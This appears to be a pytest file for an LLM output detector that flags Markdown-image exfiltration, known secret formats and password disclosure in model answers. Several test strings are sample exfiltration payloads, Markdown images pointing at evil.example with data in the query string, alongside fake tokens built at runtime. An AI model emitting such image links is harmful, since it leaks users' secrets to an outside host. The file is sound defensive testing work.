"""Tests for app/detectors/output_detector.py (TODO 1.5c: Markdown image exfiltration)."""

from app.detectors.output_detector import OutputDetector

ALLOWLIST = ("acme.fr",)


def test_markdown_image_to_external_host_true_positive():
    result = OutputDetector(ALLOWLIST).detect("Done! ![x](https://evil.example/p.png?q=secret)")
    assert result["findings"] == ["markdown_image_exfil"]
    assert result["exfil_hosts"] == ["evil.example"]


def test_markdown_image_to_allowlisted_host_false_positive():
    assert OutputDetector(ALLOWLIST).detect("![logo](https://intranet.acme.fr/logo.png)")["findings"] == []


def test_plain_link_is_not_an_image():
    # A normal link needs a click; unapproved links are the indirect detector's job.
    assert OutputDetector(ALLOWLIST).detect("[portal](https://evil.example)")["findings"] == []


def test_angle_bracket_and_spaces_variant():
    assert OutputDetector(ALLOWLIST).detect("![ a ]( <https://evil.example/t.gif?d=1> )")["findings"] == [
        "markdown_image_exfil"
    ]


# ------------------------------------------------------------------ secrets (P2)
# Fake secrets are built at runtime so no real-looking token sits in the source
# (GitHub Push Protection). None of them is a real credential.
import pytest  # noqa: E402

from app.logging.audit import REDACTED, make_excerpt  # noqa: E402
from app.pipeline import scan  # noqa: E402

FAKE_SECRETS = {
    "stripe_key": "sk_" + "live_" + "0fake" * 8,
    "aws_access_key_id": "AK" + "IA" + "FAKE" * 4,
    "github_token": "gh" + "p_" + "Fake0" * 8,
    "slack_token": "xo" + "xb-" + "0000-fake-" * 3,
    "google_api_key": "AI" + "za" + "Fake_" * 7,
    "private_key": "-----BEGIN " + "RSA PRIVATE" + " KEY-----",
    "jwt": "ey" + "J" + "hbGciOiJIUzI1" + ".ey" + "J" + "zdWIiOiIxMjM0" + ".Fake_signature_0",
}

# Benign look-alikes: must NOT be reported as a known secret format.
NOT_SECRETS = {
    "stripe_key": "Le SKU sk_live est référencé dans le catalogue.",
    "aws_access_key_id": "La référence AKIA-2026 du ticket est close.",
    "github_token": "Le dépôt ghp-docs contient la documentation.",
    "slack_token": "Contactez xoxb sur Teams.",
    "google_api_key": "Le projet AIzaFR démarre lundi.",
    "private_key": "-----BEGIN CERTIFICATE----- est une clé publique, pas privée.",
    "jwt": "Le fichier eyJ.txt est vide.",
}


@pytest.mark.parametrize("kind", sorted(FAKE_SECRETS))
def test_known_secret_format_true_positive(kind):
    result = OutputDetector(ALLOWLIST).detect(f"Voici la valeur : {FAKE_SECRETS[kind]}")
    assert "secret_known_format" in result["findings"]
    assert result["secret_kinds"] == [kind]
    assert FAKE_SECRETS[kind] not in str(result)  # the value itself is never returned


@pytest.mark.parametrize("kind", sorted(NOT_SECRETS))
def test_known_secret_format_false_positive(kind):
    result = OutputDetector(ALLOWLIST).detect(NOT_SECRETS[kind])
    assert result["secret_kinds"] == [] and "secret_known_format" not in result["findings"]


@pytest.mark.parametrize("text", [
    "Le mot de passe temporaire est Acme2026!",
    "Votre mot de passe : Printemps#26",
    "The reset password is hunter2",
    "mdp = Azerty123",
    "Le mot de passe du wifi est Invite-2026",
    "api_key=fake0fake0fake",
])
def test_credential_disclosure_true_positive(text):
    assert "credential_disclosure" in OutputDetector(ALLOWLIST).detect(text)["findings"]


@pytest.mark.parametrize("text", [
    "Le mot de passe est personnel et ne doit jamais être communiqué.",
    "Choisissez un mot de passe de 14 caractères minimum.",
    "Mot de passe : 14 caractères minimum.",
    "Le mot de passe est changé sur https://moncompte.acme.fr.",
    "Identifiant : prenom.nom, mot de passe : celui de votre session.",
    "Le jeton est valable 30 jours.",
    "Le secret est de verrouiller sa session.",
])
def test_credential_disclosure_false_positive(text):
    assert "credential_disclosure" not in OutputDetector(ALLOWLIST).detect(text)["findings"]


def test_secret_in_llm_output_blocks():
    result = scan(f"Utilisez la clé {FAKE_SECRETS['aws_access_key_id']} pour vous connecter.", "llm_output")
    assert result.decision == "BLOCK"
    assert result.owasp == "LLM02" and "sensitive_info_disclosure" in result.labels


def test_credential_disclosure_in_llm_output_warns():
    result = scan("Le mot de passe temporaire est Acme2026!", "llm_output")
    assert result.decision == "WARN" and result.owasp == "LLM02"


def test_secret_detection_is_output_only():
    # A procedure quoting a format is not an output leak; the output detector is off elsewhere.
    assert scan("Le mot de passe temporaire est Acme2026!", "retrieved_chunk").decision == "ALLOW"


@pytest.mark.parametrize("kind", sorted(FAKE_SECRETS))
def test_audit_excerpt_never_contains_a_known_secret(kind):
    excerpt = make_excerpt(f"Réponse : {FAKE_SECRETS[kind]} fin")
    assert FAKE_SECRETS[kind] not in excerpt and REDACTED in excerpt
